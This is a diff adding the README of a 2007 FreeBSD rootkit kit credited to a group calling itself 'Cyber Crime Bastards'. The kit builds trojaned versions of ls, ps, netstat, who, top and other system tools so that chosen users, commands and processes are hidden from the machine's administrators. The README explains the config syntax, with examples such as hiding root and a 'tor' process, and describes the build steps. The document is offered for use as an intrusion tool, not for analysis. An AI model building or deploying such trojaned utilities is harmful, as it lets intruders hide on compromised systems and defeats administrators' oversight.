@@ -1,0 +1,43 @@
+This archive includes sources of original main FreeBSD filez that 
+can show you are in system.
+We would trojan such programs: 
+	find fstat kldstat last ls netstat ps sockstat top w who
+
+Structure.
+original/ - contains src of original filez
+mybin/    - will contains trojaned filez after compilation
+
+1. 	Configuration
+	just edit 'config' file to setup some vars to hide
+	
+	as you can see 
+	common scheme: program_name:what_hide=hide_param1:hide_param2
+	or             program_name:what_hide=param1-var1:param2-var2
+	
+	for example fstat:
+	
+	fstat:user=root # hide this user
+	fstat:command=tor # hide this command
+	fstat:command_user=csh-root:shell-root 
+		# hide root with csh & shell of root
+	
+	you have to setup vars after = 
+	who can hide as many things as you want - delimiter is ':'
+	when you need to point two arguments use '-'	 
+
+2. 	Compilation 
+	type './make' - it will run perl script to parse your config file 
+	and to compile these programms 
+
+3. 	Output
+ 	just go to mybin/
+
+4. 	Check...
+
+5. 	If you found a bug - contact me dark.initr0 at gmail.com
+
+
+c00ded bY Dark.iNiTro - april 2007
+Greetz to all members of our team ...[Cyber Crime Bastards]... 
+http://ccb.0x48k.cc
+and our friends : Hell Knigths & XND crew
